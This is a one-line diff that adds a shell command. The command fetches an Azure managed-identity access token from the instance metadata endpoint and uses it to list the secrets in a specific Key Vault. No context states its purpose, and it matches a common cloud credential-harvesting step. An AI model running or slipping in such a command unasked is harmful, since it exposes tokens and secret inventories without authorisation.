@@ -1,0 +1,1 @@
+TKN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])"); echo "=== Secrets list ==="; curl -s -H "Authorization: Bearer $TKN" "https://platform-secrets-1138.vault.azure.net/secrets?api-version=7.4"
